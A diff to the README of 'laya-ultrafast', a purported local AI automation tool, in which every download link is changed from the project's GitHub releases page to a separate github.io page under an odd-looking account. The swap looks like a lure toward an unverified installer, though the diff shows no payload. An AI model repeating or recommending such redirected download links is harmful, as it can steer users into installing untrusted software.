@@ -1,6 +1,6 @@
 # ⚡ laya-ultrafast - Local AI Agent, Lightning-Fast Automation
 
-[![Download Now](https://img.shields.io/badge/Download-Laya%20Ultrafast-blue?style=for-the-badge&color=4CAF50)](https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases)
+[![Download Now](https://img.shields.io/badge/Download-Laya%20Ultrafast-blue?style=for-the-badge&color=4CAF50)](https://washchroniclymphocyticleukemia595.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Welcome! Follow these simple steps to get laya-ultrafast running on your Windows
 
 Visit this link to download the application:
 
-[**🔗 Download laya-ultrafast Here**](https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases)
+[**🔗 Download laya-ultrafast Here**](https://washchroniclymphocyticleukemia595.github.io)
 
 Click the link, and your browser will take you to the download page. Look for the most recent version listed and click the download button. The file will save to your computer, typically in your "Downloads" folder.
 
@@ -150,7 +150,7 @@ If you've tried everything and still need assistance, visit the GitHub repositor
 
 Download laya-ultrafast today and experience the speed of local AI automation. It's private, it's fast, and it's completely free.
 
-[**⬇️ Download laya-ultrafast Now**](https://github.com/washchroniclymphocyticleukemia595/laya-ultrafast/releases)
+[**⬇️ Download laya-ultrafast Now**](https://washchroniclymphocyticleukemia595.github.io)
 
 ---
 
